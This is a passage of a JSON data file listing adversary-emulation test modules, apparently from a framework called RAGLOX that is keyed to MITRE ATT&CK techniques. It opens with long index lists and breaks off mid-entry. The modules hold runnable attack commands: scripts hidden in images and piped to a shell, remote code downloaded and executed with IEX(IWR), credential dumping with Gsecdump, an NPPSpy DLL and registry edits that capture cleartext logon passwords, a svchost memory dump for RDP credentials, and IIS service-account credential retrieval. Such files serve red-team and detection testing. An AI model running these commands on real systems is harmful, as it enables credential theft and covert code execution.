        1107,
        1108,
        1109,
        1111,
        1112,
        1113,
        1114,
        1115,
        1116,
        1117,
        1118,
        1119,
        1120,
        1121,
        1122,
        1123,
        1124,
        1125,
        1126,
        1127,
        1129,
        1133,
        1134,
        1142,
        1146,
        1147,
        1159,
        1160,
        1161,
        1162,
        1163,
        1164,
        1170,
        1171,
        1172,
        1173,
        1174,
        1175,
        1176,
        1177,
        1178,
        1179,
        1180,
        1181,
        1185,
        1188,
        1189,
        1191,
        1192,
        1193,
        1201,
        1202,
        1203,
        1204,
        1205,
        1206,
        1207,
        1208,
        1209,
        1210,
        1211,
        1212,
        1213,
        1214,
        1215,
        1216,
        1218,
        1219,
        1220,
        1221,
        1222,
        1223,
        1224,
        1225,
        1226,
        1227,
        1232,
        1234,
        1235,
        1240,
        1241,
        1242,
        1243,
        1244,
        1245,
        1246,
        1247,
        1248,
        1249,
        1250,
        1251,
        1252,
        1253,
        1254,
        1255,
        1256,
        1257,
        1258,
        1260,
        1267,
        1269,
        1270,
        1271,
        1272,
        1273,
        1274,
        1277,
        1279,
        1280,
        1281,
        1282,
        1283,
        1284,
        1285,
        1286,
        1287,
        1288,
        1289,
        1290,
        1296,
        1297,
        1298,
        1299,
        1300,
        1301,
        1303,
        1305,
        1307,
        1308,
        1309,
        1310,
        1311,
        1312,
        1315,
        1316,
        1317,
        1318,
        1319,
        1320,
        1321,
        1322,
        1330,
        1332,
        1346,
        1348,
        1352,
        1353,
        1354,
        1355,
        1356,
        1357,
        1362,
        1364,
        1366,
        1369,
        1377,
        1378,
        1386,
        1396,
        1397,
        1398,
        1399,
        1400,
        1408,
        1409,
        1410,
        1411,
        1412,
        1413,
        1414,
        1415,
        1417,
        1420,
        1429,
        1435,
        1441,
        1447,
        1452,
        1453,
        1454,
        1455,
        1456,
        1457,
        1458,
        1485,
        1490,
        1492,
        1497,
        1498,
        1499,
        1500,
        1501,
        1503,
        1504,
        1505,
        1506,
        1507,
        1508,
        1509,
        1510,
        1511,
        1513,
        1514,
        1515,
        1516,
        1517,
        1519,
        1520,
        1521,
        1522,
        1523,
        1524,
        1526,
        1527,
        1528,
        1530,
        1531,
        1532,
        1533,
        1534,
        1535,
        1536,
        1537,
        1538,
        1539,
        1540,
        1541,
        1542,
        1543,
        1544,
        1546,
        1547,
        1548,
        1549,
        1550,
        1551,
        1552,
        1553,
        1554,
        1555,
        1556,
        1557,
        1558,
        1561,
        1562,
        1563,
        1566,
        1567,
        1568,
        1579,
        1580,
        1584,
        1585,
        1586,
        1587,
        1588,
        1589,
        1590,
        1591,
        1592,
        1593,
        1594,
        1595,
        1596,
        1597,
        1598,
        1599,
        1600,
        1601,
        1602,
        1604,
        1606,
        1607,
        1608,
        1609,
        1610,
        1611,
        1612,
        1613,
        1614,
        1617,
        1618,
        1619,
        1630,
        1631,
        1634,
        1635,
        1636,
        1638,
        1639,
        1640,
        1644,
        1645,
        1649,
        1650,
        1651,
        1652,
        1653,
        1654,
        1657,
        1658,
        1665,
        1674,
        1675,
        1677,
        1679,
        1680,
        1681,
        1682,
        1683,
        1689,
        1694,
        1695,
        1696,
        1699,
        1700,
        1704,
        1708,
        1715,
        1722,
        1723,
        1735,
        1740,
        1743,
        1749,
        1759
      ],
      "not_required": [
        2,
        8,
        9,
        14,
        28,
        29,
        30,
        43,
        44,
        45,
        52,
        55,
        56,
        57,
        60,
        61,
        62,
        63,
        64,
        65,
        66,
        67,
        70,
        73,
        78,
        79,
        80,
        81,
        82,
        83,
        84,
        86,
        87,
        88,
        89,
        90,
        91,
        92,
        93,
        94,
        95,
        96,
        97,
        98,
        99,
        102,
        103,
        104,
        105,
        106,
        107,
        108,
        109,
        110,
        111,
        112,
        113,
        114,
        115,
        116,
        117,
        120,
        121,
        122,
        125,
        126,
        128,
        131,
        133,
        134,
        135,
        136,
        137,
        138,
        139,
        140,
        141,
        143,
        144,
        145,
        146,
        147,
        148,
        149,
        150,
        151,
        152,
        153,
        154,
        155,
        157,
        158,
        159,
        160,
        161,
        162,
        163,
        164,
        165,
        166,
        167,
        168,
        169,
        170,
        171,
        172,
        173,
        174,
        175,
        176,
        180,
        182,
        183,
        185,
        186,
        187,
        188,
        189,
        214,
        215,
        216,
        219,
        220,
        221,
        222,
        223,
        224,
        225,
        228,
        229,
        230,
        231,
        232,
        233,
        234,
        236,
        238,
        239,
        240,
        241,
        242,
        243,
        244,
        245,
        246,
        247,
        248,
        249,
        250,
        251,
        253,
        254,
        255,
        256,
        257,
        258,
        259,
        261,
        262,
        263,
        264,
        269,
        271,
        272,
        274,
        276,
        281,
        283,
        284,
        285,
        286,
        287,
        288,
        290,
        291,
        292,
        293,
        294,
        295,
        296,
        299,
        301,
        302,
        303,
        304,
        305,
        306,
        307,
        308,
        309,
        315,
        318,
        319,
        320,
        321,
        323,
        324,
        325,
        326,
        327,
        328,
        331,
        332,
        334,
        335,
        337,
        338,
        339,
        340,
        341,
        342,
        343,
        345,
        346,
        347,
        348,
        349,
        351,
        352,
        353,
        354,
        355,
        356,
        357,
        358,
        359,
        360,
        362,
        363,
        364,
        365,
        366,
        367,
        368,
        369,
        370,
        372,
        373,
        374,
        375,
        376,
        377,
        379,
        380,
        381,
        382,
        383,
        384,
        385,
        386,
        387,
        388,
        389,
        390,
        391,
        392,
        393,
        394,
        395,
        396,
        397,
        398,
        399,
        400,
        401,
        402,
        403,
        404,
        405,
        406,
        407,
        408,
        410,
        412,
        436,
        437,
        438,
        439,
        440,
        441,
        442,
        443,
        444,
        446,
        447,
        448,
        449,
        450,
        451,
        452,
        453,
        454,
        455,
        456,
        457,
        459,
        461,
        462,
        463,
        466,
        467,
        469,
        470,
        471,
        472,
        473,
        474,
        482,
        483,
        484,
        485,
        486,
        487,
        488,
        489,
        492,
        493,
        494,
        495,
        512,
        513,
        514,
        515,
        516,
        517,
        520,
        521,
        522,
        523,
        524,
        525,
        526,
        527,
        528,
        529,
        530,
        531,
        532,
        533,
        534,
        535,
        536,
        537,
        539,
        540,
        541,
        543,
        544,
        545,
        546,
        547,
        548,
        549,
        551,
        552,
        553,
        554,
        555,
        556,
        557,
        558,
        559,
        560,
        561,
        562,
        563,
        564,
        566,
        567,
        568,
        569,
        570,
        571,
        572,
        573,
        574,
        575,
        576,
        577,
        578,
        579,
        580,
        581,
        582,
        583,
        584,
        585,
        586,
        587,
        588,
        589,
        590,
        591,
        592,
        593,
        594,
        595,
        596,
        597,
        598,
        599,
        600,
        602,
        603,
        605,
        606,
        607,
        608,
        609,
        610,
        612,
        613,
        614,
        615,
        616,
        617,
        618,
        620,
        621,
        622,
        623,
        624,
        625,
        626,
        627,
        628,
        629,
        630,
        631,
        632,
        633,
        634,
        636,
        637,
        638,
        639,
        640,
        641,
        642,
        643,
        644,
        647,
        648,
        649,
        650,
        651,
        652,
        653,
        654,
        655,
        656,
        657,
        658,
        659,
        660,
        661,
        662,
        665,
        667,
        672,
        673,
        674,
        675,
        676,
        677,
        678,
        679,
        680,
        681,
        682,
        686,
        688,
        689,
        690,
        691,
        692,
        693,
        694,
        695,
        696,
        697,
        698,
        699,
        700,
        701,
        705,
        706,
        707,
        732,
        740,
        741,
        759,
        760,
        761,
        762,
        763,
        764,
        765,
        766,
        767,
        768,
        769,
        791,
        792,
        793,
        794,
        795,
        796,
        797,
        798,
        800,
        801,
        802,
        803,
        804,
        805,
        806,
        807,
        808,
        809,
        810,
        811,
        812,
        813,
        814,
        815,
        816,
        817,
        818,
        819,
        820,
        821,
        822,
        823,
        824,
        825,
        826,
        827,
        828,
        829,
        830,
        831,
        832,
        833,
        837,
        841,
        842,
        843,
        844,
        845,
        846,
        848,
        851,
        852,
        853,
        854,
        855,
        856,
        857,
        858,
        859,
        869,
        870,
        871,
        872,
        873,
        874,
        875,
        876,
        877,
        878,
        880,
        881,
        882,
        883,
        884,
        885,
        886,
        887,
        888,
        889,
        890,
        891,
        892,
        893,
        894,
        895,
        896,
        897,
        898,
        899,
        900,
        901,
        903,
        904,
        905,
        906,
        907,
        908,
        909,
        910,
        911,
        912,
        913,
        914,
        915,
        916,
        917,
        918,
        919,
        920,
        921,
        923,
        924,
        925,
        926,
        927,
        928,
        929,
        930,
        931,
        932,
        933,
        934,
        935,
        936,
        937,
        938,
        939,
        940,
        941,
        944,
        945,
        946,
        947,
        948,
        949,
        950,
        951,
        952,
        953,
        954,
        955,
        959,
        960,
        961,
        962,
        963,
        964,
        965,
        966,
        967,
        968,
        969,
        971,
        972,
        973,
        974,
        975,
        976,
        977,
        978,
        979,
        980,
        981,
        982,
        983,
        984,
        985,
        986,
        987,
        988,
        989,
        990,
        991,
        992,
        993,
        994,
        995,
        996,
        997,
        998,
        999,
        1000,
        1001,
        1002,
        1003,
        1004,
        1005,
        1006,
        1007,
        1008,
        1009,
        1010,
        1011,
        1012,
        1013,
        1014,
        1015,
        1016,
        1018,
        1019,
        1020,
        1021,
        1022,
        1023,
        1024,
        1025,
        1026,
        1027,
        1028,
        1029,
        1030,
        1031,
        1032,
        1033,
        1034,
        1035,
        1036,
        1037,
        1038,
        1050,
        1054,
        1055,
        1056,
        1057,
        1058,
        1062,
        1063,
        1064,
        1065,
        1068,
        1069,
        1070,
        1071,
        1072,
        1073,
        1074,
        1075,
        1076,
        1077,
        1078,
        1079,
        1082,
        1083,
        1084,
        1085,
        1086,
        1087,
        1088,
        1089,
        1092,
        1093,
        1094,
        1095,
        1096,
        1097,
        1098,
        1099,
        1100,
        1101,
        1103,
        1104,
        1105,
        1110,
        1128,
        1130,
        1131,
        1132,
        1135,
        1136,
        1137,
        1138,
        1139,
        1140,
        1141,
        1143,
        1144,
        1145,
        1148,
        1149,
        1150,
        1151,
        1152,
        1153,
        1154,
        1155,
        1156,
        1157,
        1158,
        1165,
        1166,
        1167,
        1168,
        1169,
        1182,
        1183,
        1184,
        1186,
        1187,
        1190,
        1194,
        1195,
        1196,
        1197,
        1198,
        1199,
        1200,
        1217,
        1228,
        1229,
        1230,
        1231,
        1233,
        1236,
        1237,
        1238,
        1239,
        1259,
        1261,
        1262,
        1263,
        1264,
        1265,
        1266,
        1268,
        1275,
        1276,
        1278,
        1291,
        1292,
        1293,
        1294,
        1295,
        1302,
        1304,
        1306,
        1313,
        1314,
        1323,
        1324,
        1325,
        1326,
        1327,
        1328,
        1329,
        1331,
        1333,
        1334,
        1335,
        1336,
        1337,
        1338,
        1339,
        1340,
        1341,
        1342,
        1343,
        1344,
        1345,
        1347,
        1349,
        1350,
        1351,
        1358,
        1359,
        1360,
        1361,
        1363,
        1365,
        1367,
        1368,
        1370,
        1371,
        1372,
        1373,
        1374,
        1375,
        1376,
        1379,
        1380,
        1381,
        1382,
        1383,
        1384,
        1385,
        1387,
        1388,
        1389,
        1390,
        1391,
        1392,
        1393,
        1394,
        1395,
        1401,
        1402,
        1403,
        1404,
        1405,
        1406,
        1407,
        1416,
        1418,
        1419,
        1421,
        1422,
        1423,
        1424,
        1425,
        1426,
        1427,
        1428,
        1430,
        1431,
        1432,
        1433,
        1434,
        1436,
        1437,
        1438,
        1439,
        1440,
        1442,
        1443,
        1444,
        1445,
        1446,
        1448,
        1449,
        1450,
        1451,
        1459,
        1460,
        1461,
        1462,
        1463,
        1464,
        1465,
        1466,
        1467,
        1468,
        1469,
        1470,
        1471,
        1472,
        1473,
        1474,
        1475,
        1476,
        1477,
        1478,
        1479,
        1480,
        1481,
        1482,
        1483,
        1484,
        1486,
        1487,
        1488,
        1489,
        1491,
        1493,
        1494,
        1495,
        1496,
        1502,
        1512,
        1518,
        1525,
        1529,
        1545,
        1559,
        1560,
        1564,
        1565,
        1569,
        1570,
        1571,
        1572,
        1573,
        1574,
        1575,
        1576,
        1577,
        1578,
        1581,
        1582,
        1583,
        1603,
        1605,
        1615,
        1616,
        1620,
        1621,
        1622,
        1623,
        1624,
        1625,
        1626,
        1627,
        1628,
        1629,
        1632,
        1633,
        1637,
        1641,
        1642,
        1643,
        1646,
        1647,
        1648,
        1655,
        1656,
        1659,
        1660,
        1661,
        1662,
        1663,
        1664,
        1666,
        1667,
        1668,
        1669,
        1670,
        1671,
        1672,
        1673,
        1676,
        1678,
        1684,
        1685,
        1686,
        1687,
        1688,
        1690,
        1691,
        1692,
        1693,
        1697,
        1698,
        1701,
        1702,
        1703,
        1705,
        1706,
        1707,
        1709,
        1710,
        1711,
        1712,
        1713,
        1714,
        1716,
        1717,
        1718,
        1719,
        1720,
        1721,
        1724,
        1725,
        1726,
        1727,
        1728,
        1729,
        1730,
        1731,
        1732,
        1733,
        1734,
        1736,
        1737,
        1738,
        1739,
        1741,
        1742,
        1744,
        1745,
        1746,
        1747,
        1748,
        1750,
        1751,
        1752,
        1753,
        1754,
        1755,
        1756,
        1757,
        1758,
        1760
      ]
    }
  },
  "executable_tests": [
    {
      "index": 0,
      "technique_id": "T1001.002",
      "technique_name": "Data Obfuscation via Steganography",
      "description": "This RAGLOX module, named \"Steganographic Tarball Embedding\", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) \nwithin an image.\n\nThe test begins by ensuring the availability of the image file and the tarball file containing data . It then generates random passwords and saves them to a \nfile. Subsequently, the tarball file is created, containing the passwords file. The test executor command reads the contents of the image \nfile and the tarball file as byte arrays and appends them together to form a new image file. This process effectively embeds the tarball \nfile within the image, utilizing steganography techniques for data obfuscation.\n\nThis RAGLOX module simulates the technique of data obfuscation via steganography, enabling attackers to clandestinely transfer files across systems undetected. \nBy embedding the tarball file within the image, adversaries can obscure their activities, facilitating covert communication and data exfiltration.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte\n",
        "elevation_required": true,
        "cleanup_command": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"#{new_image_file}\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "image_file",
          "description": "Image file which will be downloaded to be used to hide data",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1001.002\\bin\\T1001.002.jpg"
        },
        {
          "name": "tar_file",
          "description": "Tarz file containing random passwords",
          "type": "path",
          "default_value": "$env:PUBLIC\\Downloads\\T1001.002.tarz"
        },
        {
          "name": "new_image_file",
          "description": "new image file ready for extraction",
          "type": "path",
          "default_value": "$env:PUBLIC\\Downloads\\T1001.002New.jpg"
        },
        {
          "name": "passwords_file",
          "description": "Text file containing random passwords",
          "type": "path",
          "default_value": "$env:TEMP\\random_passwords.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Image file must exist\n",
          "check_command": "if (!(Test-Path \"#{image_file}\")) {exit 1} else {\n{exit 0}\n}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{image_file}\") -ErrorAction ignore | Out-Null\nWrite-Output \"Downloading image file...\"\n$imageUrl = \"https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg\"\nInvoke-WebRequest -Uri $imageUrl -OutFile \"#{image_file}\"\n"
        },
        {
          "description": "File to hide within tarz file must exist\n",
          "check_command": "if (!(Test-Path \"#{passwords_file}\")) {exit 1} else {\n{exit 0}\n}\n",
          "install_command": "Write-Output \"Generating random passwords and saving to file...\"\n$passwords = 1..10 | ForEach-Object { -join ((1..12) | ForEach-Object { @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z') + @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') + @('0','1','2','3','4','5','6','7','8','9') + @('!','@','#','$','%','^','&','*','(','(',')','-','=','+','_','[',']','{','}','|',';',';',':',',','<','>','?') | Get-Random }) }\n$passwords | Out-File -FilePath \"#{passwords_file}\"    \n"
        },
        {
          "description": "Tarz file to embed in image must exist \n",
          "check_command": "if (!(Test-Path \"#{tar_file}\")) {exit 1} else {\n{exit 0}\n}\n",
          "install_command": "Write-Output \"Generating tarz file...\"\ntar -cvf \"#{tar_file}\" \"#{passwords_file}\"\n"
        }
      ],
      "rx_module_id": "c7921449-8b62-4c4d-8a83-d9281ac0190b",
      "module_name": "Steganographic Tarball Embedding"
    },
    {
      "index": 1,
      "technique_id": "T1001.002",
      "technique_name": "Data Obfuscation via Steganography",
      "description": "This RAGLOX module demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. \nThe PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden \nwithin the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.\n\nThe test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this RAGLOX module, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This\nis done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd \"PathToRagloxModulesFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"\n",
        "elevation_required": true,
        "cleanup_command": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore        \n"
      },
      "variables": [
        {
          "name": "image_file",
          "description": "Malicious Image file which will be downloaded",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1001.002\\bin\\evil_kitten.jpg"
        },
        {
          "name": "psimage_script",
          "description": "Extract-Invoke-PSImage Script downloaded",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\ExternalPayloads\\Extract-Invoke-PSImage.ps1"
        }
      ],
      "prerequisites": [
        {
          "description": "Image file must exist\n",
          "check_command": "if (!(Test-Path \"#{image_file}\")) {exit 1} else {\n{exit 0}\n}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{image_file}\") -ErrorAction Ignore | Out-Null\nWrite-Output \"Downloading image file...\"\n$imageUrl = \"https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg\"\nInvoke-WebRequest -Uri $imageUrl -OutFile #{image_file}\n"
        },
        {
          "description": "Extract-Invoke-PSImage must exist\n",
          "check_command": "if (!(Test-Path \"#{psimage_script}\")) {exit 1} else {\n{exit 0}\n}\n",
          "install_command": "New-Item -Path \"PathToRagloxModulesFolder\\ExternalPayloads\\\" -ItemType Directory -Force | Out-Null\nWrite-Output \"Downloading Extract-Invoke-PSImage.ps1 script...\"\n$scriptUrl = \"https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1\"\nInvoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}\n"
        }
      ],
      "rx_module_id": "04bb8e3d-1670-46ab-a3f1-5cee64da29b6",
      "module_name": "Embedded Script in Image Execution via Extract-Invoke-PSImage"
    },
    {
      "index": 2,
      "technique_id": "T1001.002",
      "technique_name": "Data Obfuscation via Steganography",
      "description": "This RAGLOX module demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat \"#{script}\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"#{image}\" - > \"#{evil_image}\"; strings \"#{evil_image}\" | tail -n 1 | base64 -d | sh",
        "elevation_required": false,
        "cleanup_command": "rm \"#{evil_image}\""
      },
      "variables": [
        {
          "name": "script",
          "description": "Shell Script file to be embedded and executed",
          "type": "String",
          "default_value": "PathToRagloxModulesFolder/script.sh"
        },
        {
          "name": "evil_image",
          "description": "The modified image with embedded script",
          "type": "String",
          "default_value": "PathToRagloxModulesFolder/evil_image.jpg"
        },
        {
          "name": "image",
          "description": "Image file to be embedded",
          "type": "String",
          "default_value": "PathToRagloxModulesFolder/image.jpg"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4ff61684-ad91-405c-9fbc-048354ff1d07",
      "module_name": "Execute Embedded Script in Image via Steganography"
    },
    {
      "index": 3,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{gsecdump_exe}\" -a\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "gsecdump_exe",
          "description": "Path to the Gsecdump executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\gsecdump.exe"
        },
        {
          "name": "gsecdump_bin_hash",
          "description": "File hash of the Gsecdump binary file",
          "type": "string",
          "default_value": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC"
        },
        {
          "name": "gsecdump_url",
          "description": "Path to download Gsecdump binary file",
          "type": "url",
          "default_value": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n",
          "check_command": "if (Test-Path \"#{gsecdump_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n"
        }
      ],
      "rx_module_id": "96345bfc-8ae7-4b6a-80b7-223200f24ef9",
      "module_name": "Gsecdump"
    },
    {
      "index": 4,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
        "elevation_required": true,
        "cleanup_command": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "NPPSpy.dll must be available in ExternalPayloads directory",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NPPSPY.dll\") {exit 0} else {exit 1}",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NPPSPY.dll\""
        }
      ],
      "rx_module_id": "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6",
      "module_name": "Credential Dumping with NPPSpy"
    },
    {
      "index": 5,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d400090a-d8ca-4be0-982e-c70598a23de9",
      "module_name": "Dump svchost.exe to gather RDP credentials"
    },
    {
      "index": 6,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "IIS must be installed prior to running the test",
          "check_command": "if ((Get-WindowsFeature Web-Server).InstallState -eq \"Installed\") {exit 0} else {exit 1}",
          "install_command": "Install-WindowsFeature -name Web-Server -IncludeManagementTools"
        }
      ],
      "rx_module_id": "6c7a4fd3-5b0b-4b30-a93e-39411b25d889",
      "module_name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)"
    },
    {
      "index": 7,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
      "execution": {
        "platforms": [
          "windows"
        ],
